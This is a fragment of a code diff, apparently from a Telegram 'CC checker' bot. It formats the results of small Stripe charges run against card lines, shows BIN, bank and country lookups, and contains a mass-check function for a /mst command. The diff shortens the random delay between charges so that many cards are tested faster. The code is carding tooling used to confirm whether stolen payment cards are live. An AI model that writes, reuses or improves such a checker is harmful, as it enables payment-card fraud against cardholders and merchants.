+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
     except Exception as e:
         elapsed_time = time.time() - start_time
-        # Get BIN info even for errors to ensure we have it
-        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
         return f"""
 ❌ ERROR
 
 💳𝗖𝗖 ⇾ {cc_line.strip()}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown - Unknown - Unknown
+🏛️𝗕𝗮𝗻𝗸: Unavailable
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown 🏳️
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -391,14 +526,14 @@ def check_single_cc(cc_line):
 
 # Mass CC check function for /mst command  
 def check_mass_cc(cc_lines):
-    """Process multiple CCs - keep original function signature"""
+    """Process multiple CCs - EXACTLY LIKE YOUR OLD FILE"""
     results = []
     for cc_line in cc_lines:
         try:
             result = test_charge(cc_line.strip())
             results.append(result)
             # Add delay between requests
-            time.sleep(random.uniform(2, 4))
+            time.sleep(random.uniform(1, 2))
         except Exception as e:
             results.append(f"❌ Error processing card: {str(e)}")
     
